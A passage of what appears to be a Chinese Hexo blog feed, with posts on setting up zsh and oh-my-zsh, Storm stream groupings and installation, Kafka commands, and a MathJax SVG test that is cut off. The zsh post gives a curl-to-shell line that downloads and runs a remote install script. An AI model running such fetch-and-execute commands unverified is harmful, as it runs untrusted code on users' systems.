href="http://puretech.iteye.com/blog/2008663">http://puretech.iteye.com/blog/2008663</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WeakReference </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>终极Shell－－zsh</title>
      <link href="/2016/09/06/%E7%BB%88%E6%9E%81Shell%EF%BC%8D%EF%BC%8Dzsh/"/>
      <url>/2016/09/06/%E7%BB%88%E6%9E%81Shell%EF%BC%8D%EF%BC%8Dzsh/</url>
      
        <content type="html"><![CDATA[<p>如果你在用Shell，默认那用bash，那一定要试试zsh，配合<code>oh-my-zsh</code>那必须推荐，很骚，真的很骚～～</p><ul><li>官网地址: <a href="http://ohmyz.sh/">http://ohmyz.sh</a></li><li>Github: <a href="https://github.com/robbyrussell/oh-my-zsh">https://github.com/robbyrussell/oh-my-zsh</a></li></ul><p>官网写着</p><blockquote><p>Your terminal never felt this good before.</p></blockquote><span id="more"></span><p>安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure><p>~&#x2F;.zshrc 我的配置如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> ZSH=<span class="variable">$HOME</span>/.oh-my-zsh</span><br><span class="line">ZSH_THEME=<span class="string">&quot;robbyrussell&quot;</span></span><br><span class="line">plugins=(brew nmap osx <span class="built_in">history</span> git mvn gradle node npm gradle svn sed autojump <span class="built_in">kill</span> docker docker-compose)</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$PATH</span>:/opt/X11/bin:/usr/local/mysql/bin&quot;</span></span><br><span class="line"><span class="built_in">source</span> <span class="variable">$ZSH</span>/oh-my-zsh.sh</span><br><span class="line"><span class="built_in">source</span> ~/.bash_profile</span><br><span class="line"><span class="built_in">source</span> ~/.zshrc.config.me</span><br></pre></td></tr></table></figure><p>一定要安装autojump神器.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">brew install autojump</span><br><span class="line">./install.sh</span><br><span class="line">[[ -s ~/.autojump/etc/profile.d/autojump.sh ]] &amp;&amp; . ~/.autojump/etc/profile.d/autojump.sh</span><br></pre></td></tr></table></figure><p>使用 zsh</p><ul><li>autojump j 这货支持模糊匹配，不用输全，一个字骚</li><li>kill 再按一个tab键，经常kill一个jar，效率很高</li><li>.. &#x2F; …  cd都不需要</li><li>tab 多按几下，有惊喜</li><li>git 一般大家都配置别名</li><li>输入一个s，上下键自动提示之前匹配的输入的命令，比如直接出来ssh xxx,scp xxx</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zsh </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Storm的7种流分组策略Stream Grouping</title>
      <link href="/2016/09/06/Storm%E7%9A%847%E7%A7%8D%E6%B5%81%E5%88%86%E7%BB%84%E7%AD%96%E7%95%A5Stream%20Grouping/"/>
      <url>/2016/09/06/Storm%E7%9A%847%E7%A7%8D%E6%B5%81%E5%88%86%E7%BB%84%E7%AD%96%E7%95%A5Stream%20Grouping/</url>
      
        <content type="html"><![CDATA[<h2 id="流分组策略-Stream-Grouping"><a href="#流分组策略-Stream-Grouping" class="headerlink" title="流分组策略(Stream Grouping)"></a>流分组策略(Stream Grouping)</h2><p>Stream Grouping，告诉topology如何在两个组件之间发送tuple<br>定义一个topology的其中一步是定义每个bolt接收什么样的流作为输入。stream grouping就是用来定义一个stream应该如果分配数据给bolts上面的多个tasks </p><p>Storm里面有7种类型的stream grouping，也可以通过实现CustomStreamGrouping接口来实现自定义Grouping </p><span id="more"></span><h3 id="Shuffle-Grouping"><a href="#Shuffle-Grouping" class="headerlink" title="Shuffle Grouping"></a>Shuffle Grouping</h3><p>随机分组，随机派发stream里面的tuple，保证每个bolt task接收到的tuple数目大致相同。 </p><h3 id="Fields-Grouping"><a href="#Fields-Grouping" class="headerlink" title="Fields Grouping"></a>Fields Grouping</h3><p>按字段分组，比如，按”user-id”这个字段来分组，那么具有同样”user-id”的 tuple 会被分到相同的Bolt里的一个task， 而不同的”user-id”则可能会被分配到不同的task。 </p><h3 id="All-Grouping"><a href="#All-Grouping" class="headerlink" title="All Grouping"></a>All Grouping</h3><p>广播发送，对亍每一个tuple，所有的bolts都会收到 </p><h3 id="Global-Grouping"><a href="#Global-Grouping" class="headerlink" title="Global Grouping"></a>Global Grouping</h3><p>全局分组，整个stream被分配到storm中的一个bolt的其中一个task。再具体一点就是分配给id值最低的那个task。 </p><h3 id="None-Grouping"><a href="#None-Grouping" class="headerlink" title="None Grouping"></a>None Grouping</h3><p>不分组，这个分组的意思是说stream不关心到底怎样分组。目前这种分组和Shuffle grouping是一样的效果， 有一点不同的是storm会把使用none grouping的这个bolt放到这个bolt的订阅者同一个线程里面去执行（如果可能的话）。 </p><h3 id="Direct-Grouping"><a href="#Direct-Grouping" class="headerlink" title="Direct Grouping"></a>Direct Grouping</h3><p>指向型分组， 这是一种比较特别的分组方法，用这种分组意味着消息（tuple）的发送者指定由消息接收者的哪个task处理这个消息。只有被声明为 Direct Stream 的消息流可以声明这种分组方法。而且这种消息tuple必须使用 emitDirect 方法来发射。消息处理者可以通过 TopologyContext 来获取处理它的消息的task的id (OutputCollector.emit方法也会返回task的id)  </p><h3 id="Local-or-shuffle-grouping"><a href="#Local-or-shuffle-grouping" class="headerlink" title="Local or shuffle grouping"></a>Local or shuffle grouping</h3><p>本地或随机分组。如果目标bolt有一个或者多个task与源bolt的task在同一个工作进程中，tuple将会被随机发送给这些同进程中的tasks。否则，和普通的Shuffle Grouping行为一致。 </p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Storm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Storm安装</title>
      <link href="/2016/09/06/Storm%E5%AE%89%E8%A3%85/"/>
      <url>/2016/09/06/Storm%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<p>前提需要一个zookeeper，一个节点或者一个cluster，接下来标准流程</p><ul><li>wget …</li><li>tar -xzvf …</li><li>cd …</li><li>vim conf&#x2F;storm.yaml</li></ul><span id="more"></span><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">########### These MUST be filled in for a storm configuration</span></span><br><span class="line">storm.zookeeper.servers:</span><br><span class="line">     - <span class="string">&quot;192.168.1.110&quot;</span></span><br><span class="line"><span class="comment">#     - &quot;server2&quot; 如果多个，就排着</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">numbus.seeds: [<span class="string">&quot;127.0.0.1&quot;</span>] 本机就行，先跑起来</span><br></pre></td></tr></table></figure><p>各种start以后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bin/storm nimbus &amp; 后台去 </span><br><span class="line">bin/storm supervisor &amp; 后台去 </span><br><span class="line">bin/storm ui &amp; 后台去</span><br></pre></td></tr></table></figure><p>开了ui后会打开http的8080端口，里面能看到服务器的状态，之后提交一个Topology到Storm上，Topology 从提交的那一刻就会一直运行，接收spout的数据，直到手动结束</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/storm jar examples/storm-starter/storm-starter-topologies-*.jar storm.starter.StatefulTopology statetopology</span><br></pre></td></tr></table></figure><p>Let’s get the ball rolling ～～～</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Storm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kafka</title>
      <link href="/2016/09/06/kafka/"/>
      <url>/2016/09/06/kafka/</url>
      
        <content type="html"><![CDATA[<p>wget –&gt; tar -xzvf –&gt; cd –&gt;</p><p>注意绑定的ip地址，配置文件，server.properties</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bin/zookeeper-server-start.sh config/zookeeper.properties &amp;</span><br><span class="line">bin/kafka-server-start.sh config/server.properties &amp;  </span><br><span class="line">bin/kafka-server-stop.sh   </span><br><span class="line">bin/zookeeper-server-stop.sh  </span><br><span class="line">bin/kafka-console-producer.sh --broker-list localhost:9092 --topic <span class="built_in">test</span>  </span><br><span class="line">bin/kafka-console-consumer.sh --zookeeper localhost:2181 --topic <span class="built_in">test</span> --from-beginning</span><br></pre></td></tr></table></figure><p><strong>kafka 的介绍，讲得比较细。有结构、机制、原理、备份、日志、集群。</strong></p><ul><li><a href="http://www.cnblogs.com/likehua/p/3999538.html">kafka入门：简介、使用场景、设计原理、主要配置及集群搭建</a></li><li><a href="http://www.cnblogs.com/cyfonly/p/5954614.html">kafka学习笔记：知识点整理</a></li><li><a href="http://orchome.com/505">从老版本升级kafka</a></li></ul><p>参考地址:</p><ul><li><a href="http://orchome.com/kafka/index">http://orchome.com/kafka/index</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kafka </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>测试Mathjax</title>
      <link href="/2016/08/23/%E6%B5%8B%E8%AF%95Mathjax/"/>
      <url>/2016/08/23/%E6%B5%8B%E8%AF%95Mathjax/</url>
      
        <content type="html"><![CDATA[<p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.819ex;" xmlns="http://www.w3.org/2000/svg" width="9.729ex" height="6.354ex" role="img" focusable="false" viewBox="0 -1562.5 4300.2 2808.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="munderover"><g data-mml-node="mo"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"></path></g><g data-mml-node="TeXAtom" transform="translate(148.2,-1087.9) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mi" transform="translate(509.9,1150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="msub" transform="translate(1610.7,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(562,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(2744.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(3800.2,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></svg></mjx-container> </p><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.576ex;" xmlns="http://www.w3.org/2000/svg" width="37.028ex" height="2.576ex" role="img" focusable="false" viewBox="0 -883.9 16366.3 1138.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(939,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1947.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(2392.2,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(3400.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(3845.4,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(5184.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(5628.8,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(6708,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(7374.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msubsup" transform="translate(8430.6,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mn" transform="translate(605,-247) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(9661.4,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msubsup" transform="translate(10661.6,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mn" transform="translate(605,-247) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(11892.4,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mo" transform="translate(12892.6,0)"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"></path></g><g data-mml-node="mo" transform="translate(14286.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msubsup" transform="translate(15287,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,413) scale(0.707)"><path data-c="32" 